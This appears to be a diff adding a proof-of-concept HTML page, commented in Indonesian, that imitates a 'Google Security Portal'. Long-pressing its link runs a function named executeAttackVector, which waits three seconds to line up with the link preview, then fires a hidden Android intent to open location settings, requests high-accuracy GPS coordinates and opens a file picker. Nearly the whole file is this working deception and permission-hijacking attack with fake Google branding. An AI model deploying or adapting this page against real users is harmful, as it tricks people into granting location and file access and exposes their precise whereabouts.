@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>High-Accuracy Geolocation & Settings PoC</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8f9fa;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .banner {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+        h1 {
+            font-size: 20px;
+            color: #1a73e8;
+            margin-bottom: 24px;
+        }
+        a.spoof-link {
+            display: inline-block;
+            background-color: #1a73e8;
+            color: white;
+            padding: 14px 28px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            transition: background-color 0.2s;
+        }
+        a.spoof-link:active {
+            background-color: #1557b0;
+        }
+        .info-box {
+            margin-top: 25px;
+            max-width: 320px;
+            width: 100%;
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+            font-size: 13px;
+            color: #5f6368;
+            word-break: break-all;
+            display: none;
+            text-align: left;
+        }
+        .footer-note {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #9aa0a6;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="banner">Google Security Portal</div>
+    <h1>High-Accuracy Location Verification</h1>
+
+    <!-- Target Link -->
+    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Preview Page & Location Capture</a>
+
+    <!-- Info Box untuk menampilkan hasil koordinat lokasi -->
+    <div class="info-box" id="infoBox">
+        <strong>Location Status:</strong> <span id="statusText">Initializing...</span><br>
+        <div id="coordDetails" style="margin-top: 8px;"></div>
+    </div>
+
+    <div class="footer-note">Cloud-secured verification system.</div>
+
+    <script>
+        let triggered = false;
+
+        const executeAttackVector = () => {
+            if (triggered) return;
+            triggered = true;
+
+            const infoBox = document.getElementById("infoBox");
+            const statusText = document.getElementById("statusText");
+            const coordDetails = document.getElementById("coordDetails");
+            
+            infoBox.style.display = "block";
+            statusText.innerText = "Requesting location permissions & triggering settings...";
+
+            // Timer optimized to match preview page / action sequence
+            setTimeout(async () => {
+                try {
+                    // 1. Mencoba memicu Android Intent untuk membuka pengaturan lokasi sistem
+                    // (Akan berfungsi pada browser mobile berbasis Android yang mendukung intent scheme)
+                    const intentFrame = document.createElement('iframe');
+                    intentFrame.style.display = 'none';
+                    intentFrame.src = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;";
+                    document.body.appendChild(intentFrame);
+                    setTimeout(() => document.body.removeChild(intentFrame), 1000);
+
+                    // 2. Menangkap koordinat lokasi dengan tingkat akurasi tinggi (High-Accuracy Geolocation)
+                    if ("geolocation" in navigator) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                const lat = position.coords.latitude;
+                                const lon = position.coords.longitude;
+                                const accuracy = position.coords.accuracy;
+                                const altitude = position.coords.altitude || "N/A";
+                                const speed = position.coords.speed || "N/A";
+
+                                statusText.innerText = "Location successfully captured (High Accuracy)";
+                                coordDetails.innerHTML = `
+                                    <b>Latitude:</b> ${lat}<br>
+                                    <b>Longitude:</b> ${lon}<br>
+                                    <b>Accuracy:</b> ±${accuracy} meters<br>
+                                    <b>Altitude:</b> ${altitude}<br>
+                                    <b>Speed:</b> ${speed}
+                                `;
+                            },
+                            (error) => {
+                                statusText.innerText = `Geolocation error: ${error.message}`;
+                            },
+                            {
+                                enableHighAccuracy: true, // Memaksa GPS hardware aktif untuk akurasi penuh
+                                timeout: 15000,           // Batas waktu tunggu maksimal (15 detik)
+                                maximumAge: 0             // Mencegah penggunaan data cache lokasi lama
+                            }
+                        );
+                    } else {
+                        statusText.innerText = "Geolocation is not supported by this browser.";
+                    }
+
+                    // Opsional: Tetap mempertahankan pemanggilan file picker jika diperlukan dalam alur PoC Anda
+                    await window.showOpenFilePicker().catch(() => {});
+
+                } catch (err) {
+                    console.debug("Vector execution error:", err.message);
+                } finally {
+                    setTimeout(() => { triggered = false; }, 1000);
+                }
+            }, 3000);
+        };
+
+        // Event listener untuk Long Press / Context Menu
+        const targetElement = document.getElementById("targetLink");
+        
+        targetElement.addEventListener("contextmenu", (e) => {
+            // e.preventDefault(); // Uncomment baris ini jika ingin menahan menu konteks bawaan
+            executeAttackVector();
+        });
+
+        targetElement.addEventListener("touchstart", () => {}, { passive: true });
+    </script>
+
+</body>
+</html>
